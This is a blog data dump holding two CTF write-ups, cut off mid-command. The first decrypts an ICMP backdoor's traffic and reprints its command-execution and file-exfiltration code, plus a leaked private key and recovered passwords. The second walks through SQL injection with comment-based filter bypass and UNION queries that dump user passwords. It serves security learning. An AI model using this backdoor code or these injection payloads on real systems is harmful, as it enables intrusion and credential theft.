CERTIFICATE—–MIICrDCCAhWgAwIBAgIJALfe3aETCSTsMA0GCSqGSIb3DQEBCwUAMG8xCzAJBgNVBAYTAk5MMRIwEAYDVQQIDAlGbGV2b2xhbmQxETAPBgNVBAcMCFplZXdvbGRlMRQwEgYDVQQKDAtTSEEyMDE3IENURjEjMCEGCSqGSIb3DQEJARYUc2hhMjAxN2N0ZkBnbWFpbC5jb20wHhcNMTcwNzI3MTQyMzIwWhcNMTgwNzI3MTQyMzIwWjBvMQswCQYDVQQGEwJOTDESMBAGA1UECAwJRmxldm9sYW5kMREwDwYDVQQHDAhaZWV3b2xkZTEUMBIGA1UECgwLU0hBMjAxNyBDVEYxIzAhBgkqhkiG9w0BCQEWFHNoYTIwMTdjdGZAZ21haWwuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+H/mwETvdjGRnn/33zsjMOyPsg5xgSCsLDTg9D8XaeGp7ZQ1habE+9G0gabrKYntVburjitcuheXKhCo6nYWF2pSch4WjhNhCxkM++UeKRUv8xYAtSGl+6vvSrwogR+BfRuxZFAeJzvgKhNwL7sdW2CJ7Gk89pET/W6AOBNcDWwIDAQABo1AwTjAdBgNVHQ4EFgQUFeykHO7MV70l0IO87/3ogRb5VxMwHwYDVR0jBBgwFoAUFeykHO7MV70l0IO87/3ogRb5VxMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOBgQCITumB4q5A+Lu9EzUe1qAWrjAeVfXq/qVrw+byH4VqNuEOBQ7lq151VbsXI1YQXCxVbP/r5Zxb1BfS/3qHHFDuSRqYaxh9c+BRkdAdzkFebMbIocnaLuVFpn237Z/ysSt0PPrTaI3gUSoz/7gXB+nXDkYKgl7BR0a72yTuLAc0GA==—–END CERTIFICATE—–command:cat /root/certs/intranet.keycommand:—–BEGIN PRIVATE KEY—–MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqEKjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNEpXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoWBofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVPdYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQOHaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQIwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoaps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ERiuSWkHY6ll1V1m0=—–END PRIVATE KEY—–command:tcpdump -i usbmon2 -w /tmp/usb.pcapcommand:tcpdump host intranet -w /tmp/intranet.pcap Now doing the same thing for the 2nd PCAP capture by adding this to the previous backdoor.py script: 123456789infile1=\"encrypted2\"with open(infile1) as f: strin = f.read().split('SHA2017:') strin = strin[1:] for i in range(0,len(strin)): outp = n.decrypt(strin[i]) print outp 123456789kinyabitch@Debian ~/D/H/c/sha2017&gt; python back.pygetfile:/tmp/intranet.pcapgetfile:22:xMWknTPeWuv2HY5z-Tp3Th8wX049inFKvUYvyQhSnuWRsJ8XzXXMYRfYezTcfq9rVFulD0i2Etj8CN3CMylyEVucEymaXhAHKJeR134iXZXUGgFFEzT8tBp8TTPF9cH0webjPbT3NYAxdcM1Wosa6PQD4Cun6osJb5WXuXQ0hZQLKOEx3s_cDoIR2hQmLNbb7lslfPvGEB79Ti_j-CahSlhI8Dbw5ON4yMeCqMMsuPc45ZAAZ8AXWi_CKGLgOvRGJHjMt7ML7MuskilBFw3g0n6vg2nugnqLNLftwWZh8CTvwiRNjNgEATCsNg1RNELnu3n_CXb_Djwlzbsei9zXQPQKPnmdHwucaHNRX51Z5gGEaIxXcjqRyNAGYHVqsTy4BbM32F_-dd1LSKOorBBGoXQLWfKGYHeb1m271eBchjv-JWWFpzK-yHztsmZn2At3i4T_vbuW72zUj3BvoerDO-srr6RKI-4UGrwzbEpjW5PNXq2FmYeKHt5hXT4EhBTgQOXxCvjtS_LIGkPWX1S36x2xBj87JdsRpo6UqrYWrDkDVycbksITiqo7EjNu-bvmHGbxO20cSUxMqHSgbA6PmkYdKPtR_AyjZreMEIMnnw_CmD0svSTpN4NrmLe-g4qUwYj4BENz_dSmLyvN7IYnoCcVwEACDyDBjv-Yg2PY6NUBARI68jWLdmHePchpYWXS3ZKdrt1eycVErN6YhJquGOVpfY9S4_1GenYWRY8in2MeK1105Y2eBKmxWIvZ8f8iW8EGsqAIeAZ0MmJUphs4Ibp-54z1dyRUgetfile:3:8XB7Q94TDBClV8w4qhq69z3FZYrv8t2WgEKqgXrWdlHdlAFX8ALVsMhCJIBkRaym0tYdVp1SG4MaZR4Tss3uWqkUHUP2IHv2mxW9kJtXQcCFacZu6BB6WbVWAABCAAAAQgAAAAAMKUT6VQAMKT39sAgARQAANPb5QABABsB2wKgBAsCoAQEBu8YiHIz10SeSnX2AEADzDMEAAAEBCAoAJQRCAWpAmegQelnOVgAAjQAAAI0AAAAADCk9_bAADClE-lUIAEUAAH_bZ0AAQAbbvcCoAQHAqAECxiIBuyeSnX0cjPXRgBgA8YPFAAABAQgKAWpAowAlBEIUAwMAAQEWAwMAQGxEpdaDTXP8knA4zCtiwo73wxpiSMwEg4mUp0JHTM5EVi8fDHmJwxa4h0XRCtUMYW1ku3J8B2mDM4-Be7yzVgXoEHpZwVcAAEIAAABCAAAAAAwpRPpVAAwpPf2wCABFAAA09vpAAEAGwHXAqAECwKgBAQG7xiIcjPXRJ5KdyIAQAPMMbAAAAQEICgAlBEIBakCj6BB6WWhYAABcAQAAXAEAAAAMKUT6VQAMKT39sAgARQABTvb7QABABr9awKgBAsCoAQEBu8YiHIz10SeSnciAGADzZFwAAAEBCAoAJQRCAWpAoxYDAwDKBAAAxgAAASwAwAgdhAXn_d9KSZnZsG-gE9lS8acf1BQiUuNF04t4gevS8ICJtSUIJdGsE-qc2tSvQnLimi0T1iSzd47KHZC4nPZt8UmAPz8CvuPkoG2nSNnhtH7aG3vuLtigzX4okzcPOGpRgetfile:15:TcpH8DKbQqyDTZP90vOPC7ZroVI7FBLP3tehUVdCsB5kcVOtOgwoeNuBDLMQwHANdbwLTIcc8rWzDtchd96wrcnYimMMVXom7hJFk9CYIvLi1AjgVnUmgijI_ZAvr768ZkMUK9zVD1CWi7x1yw-7a3r9XPaQAx4C_VXxF42RQ7lofpm0NeTW_RQddZVBmc7JRGHSyhhgvnPK9AvSftJCCR2w4U7ivYo3uXfyVBjkj2OnMPWtUeqWQxEMSVPnTp8pQ7CHG0ZhHzowGnNued80Q9s3cR5Dkb2EeAVtwoWObjMziRAuwahOsO88dbD0mOFbJMPNCQst5qOv0KkgXc4ArGuRdj3DqLdqZboIsRIFwk1BKxHoaBedqa8F8GR2t1RZ-xR31I5RSnJrJSn-v2ktPLitzNW5K46Ors604DI6pwH3GKv1moTI-Bc_S54n1WATXNYWBcE5T8_BxHPB6ezfXuuJK-Epgfu5UDMwkRCS84b0R5GT4gYdWLqOvIF0bJrLI1OgDT-ODRNIt_Ehq3jnXlV0gIwLr0nWLzGjDh4dhGdvNC1kylYtkzta6L-eBcnkDjKhyWMZa2pL6NN5iF2RaoKswfm_ZmBEygpY0s8VlBFf0Ut7s6D1vyUNiNEGwR8LZ13L4rxE4Cz51rFPeKFO80yWeYtXEyCz7idxVoT9cp_U8ospLrMcmalnXvZL4OGPzwT7G_dpZoZ6tMYRBKwgSn1KuyvmGlY9VGyQk16PqgpAk09-tmwlYJeEhPQGlrx-JpW6agdmeibUwsMZ0-oYJBhD0cvVwyOtgetfile:13:GA1QBh84hcfGb0cIr9PNPIVMe6FUmD-x98FH5mTW_8LsuTXYhYixTcRrJXFHr1D7NuQynU669tClrXvJsQO-14bI-5v0gG8rlpuDR2L2TdfeyFhxcoPgLKuFBTAGTZkt-6I4hBZaOY3hdFmITNTH-ch29k2E8SY5M9F-KU17oyQ8Kv2J9qbceSWRyCO0dVhJq2oOVvoJzhe2bWwQSHhlPEXy20onc7fz7E58Jw-rftZqGAuQWpcnobRrFlDPLXE2UI3pU2TXi0Wzg8teEOLpb7TDA87tA6EgOqV0tSCL0C8qEI8Fv6nEBiSI1zXGfzzmY3lO6P3kNZnOV6VXTF521So8XreKqd2vNYrgNpr-IljhTLZ0HMmHn6nHlvPWfJC-MswWe41ztWWQ0-LuhvMO8MR4Yl9bpEKwJ5pF0igdOPc0hY5Finn8rTSgAGuhJYFDniX79dhdam6Mi17TAVzw1Rhnp9qGHpXpRArXk_hg5dGNSfmJe4AktaOFqHeOmpa15QLc5wZm7RTvsXYN7-EhAHWDPg7ighLZipwy54nIQcztZM4mXzRAqoIWSJb-G5IxgVRZxhAs_4db4cG4c_pNHNxNh7m3romVsiPm9zmkU2Em0Qf_suCCDsGZSN1xFUJKBtn-W0bzyGqF2dNvWuG2UKT2mTbZ3jnEEcyRp-vyfsXDaKaSNxH1dvEo8_H7L3nOsi_jkB6YwKr0_dgcSclcOx_vYkvqRq9qrL5UMsE_s2ZnjTXC46CFLJecVfRBElmjOevT4MnC4GadhYJhwaEWUEuBh8Yvh4B1getfile:165:cHurdwdnjePy6Xa5SBJU_Mbe1VPdwEuXvCW1XXCaId6Y09yNKbwX0W3KPWiTJ_ZgDoSKci1FZs9sK9gFobVoTOMBicG6atQrQ5TuoL-Er2T8HDGkhComD0AfHzgxHQRy5LbcUsRpMvLLJfsv0ULnwmfjcmk6RWT1IChIG7gUxie3xVnh9lFiOZlVFxFz_NB1JPlWpTqV-8c_tFM9tSk4ud7u4lMdjPgKPO-5eknyZiT8g5WbwDqteDdSuRAfYTl0A0EoEBqNr3wiRTxJJlhGVCWX70ki5CDNCNKMlK9YifFey6W2DMv4_5m616CWgLUNJTeowqqHWA2INCeLrn-dHZi-ADsKHNYoxEqIrJlpZCiUM5L-rOC_TtQ6COT7Aro7kaH1qdQkwgygg2qP6_Xe5mFO4IOMFkcx-51kDyjtfHUGBx2veXXEDfAScnKY9GY_905jJafZ9J8vRfeszHiD0quOv0edGw8NbKp3_pk2nL2Ey-vCIcm4lR0WXOFuOmwj67o6mk_cq2n7axOkJ8gcEc61AqJ7LzZbJFr0_b3bnaZzkXuKF_IokNRQJDpD1WfLkI_ba8Q3u2d8nui9ljBWs7VzwAl8dR1iH4QtIIturGVQEIR8jA3mn1evUTQvFjA-BN2nlOmXqyjoXU0HcaOC53Vj2d1r_J_64CmdAnlWJ-2aeG3dCoP0fYYxvKKpI1g6WXCX_Li701DtBTl6Hnp6ICHW7GEqxK96H0BfB_Sb6UQFa_9ScfbNd3ohC9xxYiiGSssqHiHkiAJ0vfYXSZYMs9YeTpSA273k...Truncated... We have alot of lines, the first line of the output gives us an hint of what are all those lines and we can see “getfile:/tmp/intranet.pcap” so if we extract all those strings after getfile:0:%s to the getfile:301:%s that string is enconded with base64 so we just needed to join them all and decode it since tshark is duplicating our data we actually had to extract 4 of them, but in reality it’s actually only two the intranet.pcap and the usb.cap (and yes! remember the IMCP decrypted packages? the hacker actually started 2 tcpdump commands!).Our final python script will be: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149import base64import sysimport timeimport subprocessimport threadingfrom Crypto import Randomfrom Crypto.Cipher import AESimport binasciiimport reBS = 16pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)unpad = lambda s : s[0:-ord(s[-1])]magic = \"SHA2017\"key2=\"K8djhaIU8H2d1jNb\"stri=\"9FEEhLIvHpDPM4qwDwPQVxuasHbiFnI6AjSY6YNDlzcRZX7T+R6azOsOHIXSTsQJFY6KWC57M7c50/Y8VoDblzthDZEAgvOglXNj5wC78R3+euE2enPioadbLZ4K2bwG8UAxdIX8sH7NAmC9LNVuluqd2TYgDss20VNwd1rJ7vmkrt55gXvCWdOieQarMbMZorDqvcRrPRJsNae1x8CHY/ukToeYt8w4T16BrqdN9ZJK+NFVxDddHjjfXCtwF2eqVZ+qZhYiDPAcy1DcQZEWJeRz+R5m98WsLqH2gJvpYY3T6h1JuTTJUDfhoqeTvrRF/z9nsGCaJQZjKY3EDrdvCQ==\"class AESCipher: def __init__( self, key ): self.key = key def encrypt( self, raw ): raw = pad(raw) iv = Random.new().read( AES.block_size ) cipher = AES.new( self.key, AES.MODE_CBC, iv ) return base64.b64encode( iv + cipher.encrypt( raw ) ) def decrypt( self, enc ): enc = base64.b64decode(enc) iv = enc[:16] cipher = AES.new(self.key, AES.MODE_CBC, iv ) return unpad(cipher.decrypt( enc[16:] ))def run_command(cmd): ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) output = ps.communicate()[0] return outputdef send_ping(host, magic, data): data = cipher.encrypt(data) load = \"&#123;&#125;:&#123;&#125;\".format(magic, data) time.sleep(1) sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)def chunks(L, n): for i in xrange(0, len(L), n): yield L[i:i+n]def get_file(host, magic, fn): time.sleep(1) data = base64.urlsafe_b64encode(open(fn, \"rb\").read()) cnt = 0 icmp_threads = [] for line in chunks(data, 500): t = threading.Thread(target = send_ping, args = (host,magic, \"getfile:&#123;&#125;:&#123;&#125;\".format(cnt,line))) t.daemon = True t.start() icmp_threads.append(t) cnt += 1 for t in icmp_threads: t.join()# cipher = AESCipher(sys.argv[1])# while True:# try: # pkts = sniff(filter=\"icmp\", timeout =5,count=1)# for packet in pkts:# if str(packet.getlayer(ICMP).type) == \"8\": # input = packet[IP].load# if input[0:len(magic)] == magic:# input = input.split(\":\")# data = cipher.decrypt(input[1]).split(\":\")# ip = packet[IP].src# if data[0] == \"command\":# output = run_command(data[1])# send_ping(ip, magic, \"command:&#123;&#125;\".format(output))# if data[0] == \"getfile\":# #print \"[+] Sending file &#123;&#125;\".format(data[1])# get_file(ip, magic, data[1])# except:# pass# break# print(final)#for i in range(0,301):# print(i, dicio[str(i)])# for k,v in dicio.iteritems(): # print(k, base64.urlsafe_b64decode(v))# print(base64.urlsafe_b64decode(final)) # if outp not in lis: # # print(outp) # print(numb) # lis.append(outp) # lis = sorted(lis) # for it in lis: # print(it)dicio = &#123;&#125;lis = []n = AESCipher(key2)infile1=\"encrypted1\"with open(infile1) as f: strin = f.read().split('SHA2017:') strin = strin[1:] for i in range(0,len(strin),2): outp = n.decrypt(strin[i])infile2=\"encrypted2\"with open(infile2) as f: strin = f.read().split('SHA2017:') strin = strin[1:] for lin in strin: outp = n.decrypt(lin) numb = re.findall(r\"getfile:([0-9]+).*\", outp) outp = re.findall(r\"getfile:[0-9]+:(.*)\", outp) if numb != []: if dicio.has_key(numb[0]): dicio[numb[0]].append(outp[0]) else: dicio[numb[0]]=[outp[0]]for j in range(0,4): final=\"\" for i in range(0,301): try: final += base64.urlsafe_b64decode(dicio[str(i)][j]) except IndexError: break file = open('lol%d.pcap'%j,'wb+') file.write(final) Now checking intranet.pcap we could see that we have more encrypted data but in this case was TLS, and then we remembered after we decrypted abuse2.cap we got our RSA.keys to decrypt these packages! so once again using wireshark to decrypt:Edit -&gt; Preferences -&gt; protocols -&gt; SSL 123kinyabitch@Debian ~/D/H/c/sha2017&gt; mv lol1.pcap intranet.pcapkinyabitch@Debian ~/D/H/c/sha2017&gt; wireshark intranet.pcap Now seeing HTTP packages we can see that the hacker downloaded file secret.zip! The zip file is protected by a password! now we either bruteforce the zip file (which was a very hard way to do it since the password was “somehow” complicated) or we needed to find it in our USB capture! which is a USB keyboard capture! 123kinyabitch@Debian ~/D/H/c/sha2017&gt; mv lol4.pcap usb.pcapkinyabitch@Debian ~/D/H/c/sha2017&gt; wireshark usb.pcap Extract the keys pressed from the usb.cap: 12kinyabitch@Debian ~/D/H/c/sha2017&gt; tshark -r usb.pcap -Y \"frame.len==72\" -Tfields -e usb.capdata &gt; usb.txt And now getting the table to decode the keys from http://www.usb.org/developers/hidpage/Hut1_12v2.pdf Writting the script: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778shift = \"02:00:00:00:00:00:00:00\"ignore = \"00:00:00:00:00:00:00:00\"ignore2 = \"01:00:00:00:00:00:00:00\"keys_dict = &#123;'04': 'a', '05': 'b', '06': 'c', '07': 'd', '08': 'e', '09': 'f', '0a': 'g', '0b': 'h', '0c': 'i', '0d': 'j', '0e': 'k', '0f': 'l', '10': 'm', '11': 'n', '12': 'o', '13': 'p', '14': 'q', '15': 'r', '16': 's', '17': 't', '18': 'u', '19': 'v', '1a': 'w', '1b': 'x', '1c': 'y', '1d': 'z', '1e': '1', '1f': '2', '20': '3', '21': '4', '22': '5', '23': '6', '24': '7', '25': '8', '26': '9', '27': '0', '28': '\\r\\n', '29': '', '2a': '', '2b': '', '2c': ' ', '2d': '-', '2e': '=', '2f': '[', '30': ']', '31': '\\\\', '32': '#', '33': ':', '34': \"'\", '35': '', '36': ',', '37': '.', '38': '/'&#125;with open('usb.txt', 'r') as f: keys_lines = f.readlines() s = \"\" for key in keys_lines: if key.strip() == shift or key.strip() == ignore or key.strip() == ignore2: continue k=key.split(\":\") #print key == ignore, key == '02:00:00:00:00:00:00:00', key if k[0] == '02': #shift pressed if keys_dict[k[2]] == '2': s += '@' else: s += keys_dict[k[2]].upper() else: s += keys_dict[k[2]] print s 1234567891011kinyabitch@Debian ~/D/H/c/sha2017&gt; python usb.pyrootWelcome123ls -lacurl -ks https://root:Welcome123@intranet/secret.zipunzip secret.zipPyj4m4P4rtY@2017cat secret.txtdisplay hamburglogoout The password is Pyj4m4P4rtY@2017 for the zip file! 1234567891011kinyabitch@Debian ~/D/H/c/sha2017&gt; unzip secret.zip Archive: secret.zip[secret.zip] secret.txt password: inflating: secret.txt inflating: hamburger_pussy.jpgkinyabitch@Debian ~/D/H/c/sha2017&gt; cat secret.txt Important passwords:secret.zip Pyj4m4P4rtY@2017root Welcome123flag flag&#123;bf107b7f64f320034df7e48669439f69&#125; Finally the flag was flag{bf107b7f64f320034df7e48669439f69}","categories":[{"name":"Network","slug":"Network","permalink":"https://teamrocketist.github.io/categories/Network/"}],"tags":[{"name":"pcap","slug":"pcap","permalink":"https://teamrocketist.github.io/tags/pcap/"},{"name":"wireshark","slug":"wireshark","permalink":"https://teamrocketist.github.io/tags/wireshark/"},{"name":"usb","slug":"usb","permalink":"https://teamrocketist.github.io/tags/usb/"},{"name":"network","slug":"network","permalink":"https://teamrocketist.github.io/tags/network/"}]},{"title":"[Web] Bugs Bunny CTF - LQI_X 140","slug":"Web-Bugs-Bunny-CTF-LQI-X-140","date":"2017-08-02T10:29:58.000Z","updated":"2018-10-24T23:21:04.830Z","comments":true,"path":"2017/08/02/Web-Bugs-Bunny-CTF-LQI-X-140/","link":"","permalink":"https://teamrocketist.github.io/2017/08/02/Web-Bugs-Bunny-CTF-LQI-X-140/","excerpt":"","text":"LQI_X140Its for your , login and get all you needtask : http://34.253.165.46/LQI_X/Author: TnMch We have login form so lets start by doing some tests with curl at the GET parameter username: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -L \"http://34.253.165.46/LQI_X/?username=test'&amp;password=\" -v* Trying 34.253.165.46...* TCP_NODELAY set* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)&gt; GET /LQI_X/?username=test'&amp;password= HTTP/1.1&gt; Host: 34.253.165.46&gt; User-Agent: curl/7.52.1&gt; Accept: */*&gt; &lt; HTTP/1.1 200 OK&lt; Date: Wed, 02 Aug 2017 10:27:30 GMT&lt; Server: Apache/2.4.18 (Ubuntu)&lt; Vary: Accept-Encoding&lt; Content-Length: 749&lt; Content-Type: text/html; charset=UTF-8&lt; &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;SQLI-F - Log-in&lt;/title&gt; &lt;link rel='stylesheet' href='http://codepen.io/assets/libs/fullpage/jquery-ui.css'&gt; &lt;link rel=\"stylesheet\" href=\"css/style.css\" media=\"screen\" type=\"text/css\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"login-card\"&gt; &lt;h1&gt;Log-in&lt;/h1&gt;&lt;br&gt; &lt;form method=\"GET\" action=\"\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"Username\"&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt; &lt;input type=\"submit\" name=\"login\" class=\"login login-submit\" value=\"login\"&gt; &lt;/form&gt; &lt;div class=\"login-help\"&gt; &lt;p&gt; &lt;/p&gt; &lt;/div&gt;&lt;/div&gt; &lt;script src='http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; Nothing seems to be Changing lets try with password: 12345678910111213141516171819curl -L \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'%20or%201=1--\" -v* Trying 34.253.165.46...* TCP_NODELAY set* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)&gt; GET /LQI_X/?username=test&amp;password=test'%20or%201=1-- HTTP/1.1&gt; Host: 34.253.165.46&gt; User-Agent: curl/7.52.1&gt; Accept: */*&gt; &lt; HTTP/1.1 200 OK&lt; Date: Wed, 02 Aug 2017 10:32:28 GMT&lt; Server: Apache/2.4.18 (Ubuntu)&lt; Content-Length: 12&lt; Content-Type: text/html; charset=UTF-8&lt; * Curl_http_done: called premature == 0* Connection #0 to host 34.253.165.46 left intactNo way SOrry Wow a custom error message? they must be filtering some characters or even words… Maybe its the spaces, lets try to use the comment technique to bypass space filtering: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/or/**/1=1--\" -v* Trying 34.253.165.46...* TCP_NODELAY set* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)&gt; GET /LQI_X/?username=test&amp;password=test'/**/or/**/1=1-- HTTP/1.1&gt; Host: 34.253.165.46&gt; User-Agent: curl/7.52.1&gt; Accept: */*&gt; &lt; HTTP/1.1 200 OK&lt; Date: Wed, 02 Aug 2017 10:37:24 GMT&lt; Server: Apache/2.4.18 (Ubuntu)&lt; Vary: Accept-Encoding&lt; Content-Length: 753&lt; Content-Type: text/html; charset=UTF-8&lt; &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;SQLI-F - Log-in&lt;/title&gt; &lt;link rel='stylesheet' href='http://codepen.io/assets/libs/fullpage/jquery-ui.css'&gt; &lt;link rel=\"stylesheet\" href=\"css/style.css\" media=\"screen\" type=\"text/css\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"login-card\"&gt; &lt;h1&gt;Log-in&lt;/h1&gt;&lt;br&gt; &lt;form method=\"GET\" action=\"\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"Username\"&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt; &lt;input type=\"submit\" name=\"login\" class=\"login login-submit\" value=\"login\"&gt; &lt;/form&gt; &lt;div class=\"login-help\"&gt; &lt;p&gt; test&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; &lt;script src='http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; It works! now lets use order by to see how many values are returned to know how many columns we will use on our union query injection. Using CURL with I option to check the status code from the request so if the query returns an error we will get a 500 (Internal Error) if not we get a 200 (OK) 12345678910111213(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -I \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/order/**/by/**/1--\"HTTP/1.1 200 OKDate: Wed, 02 Aug 2017 10:43:01 GMTServer: Apache/2.4.18 (Ubuntu)Content-Type: text/html; charset=UTF-8(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -I \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/order/**/by/**/2--\"HTTP/1.0 500 Internal Server ErrorDate: Wed, 02 Aug 2017 10:43:03 GMTServer: Apache/2.4.18 (Ubuntu)Connection: closeContent-Type: text/html; charset=UTF-8 As we can see the sql query is only selecting one column the real query must be something similar to this “Select username from table_users where username=%s and password=%s”. Now injecting with union: 123456789101112131415161718192021222324252627282930313233343536373839 curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/1--\"&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;SQLI-F - Log-in&lt;/title&gt; &lt;link rel='stylesheet' href='http://codepen.io/assets/libs/fullpage/jquery-ui.css'&gt; &lt;link rel=\"stylesheet\" href=\"css/style.css\" media=\"screen\" type=\"text/css\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"login-card\"&gt; &lt;h1&gt;Log-in&lt;/h1&gt;&lt;br&gt; &lt;form method=\"GET\" action=\"\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"Username\"&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt; &lt;input type=\"submit\" name=\"login\" class=\"login login-submit\" value=\"login\"&gt; &lt;/form&gt; &lt;div class=\"login-help\"&gt; &lt;p&gt; 1&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; &lt;script src='http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; It worked! as you can see at the image above the number “1” showed up now what I tryed after this was getting the table names from information_schema but somehow I wasn’t able to do it so I tried to guess the obvious names, assumed that the table name is users and the columns probably id,username and password. 123456789101112131415161718192021222324252627282930313233343536373839404142curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/0,1-- HTTP/1.1... &lt;div class=\"login-help\"&gt; &lt;p&gt; 1&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;...curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/1,1--\"&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/1,1-- HTTP/1.1... &lt;div class=\"login-help\"&gt; &lt;p&gt; 2&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;...curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/2,1--\"* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/2,1-- HTTP/1.1... &lt;div class=\"login-help\"&gt; &lt;p&gt; 3&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;...curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/3,1--\"&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/3,1-- HTTP/1.1... &lt;div class=\"login-help\"&gt; &lt;p&gt; 4&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;...curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/4,1--\"&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/4,1-- HTTP/1.1... &lt;div class=\"login-help\"&gt; &lt;p&gt; 5&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;... As we can see we were successful to leak the ids from the users now lets try with the password 12345678910111213141516171819202122232425262728293031(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/0,1--\".... &lt;div class=\"login-help\"&gt; &lt;p&gt; _Easy_I_Dont_Think&lt;/p&gt; &lt;/div&gt;....(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/1,1--\".... &lt;div class=\"login-help\"&gt; &lt;p&gt; hello&lt;/p&gt; &lt;/div&gt;....(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/2,1--\".... &lt;div class=\"login-help\"&gt; &lt;p&gt; here&lt;/p&gt; &lt;/div&gt;....(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v 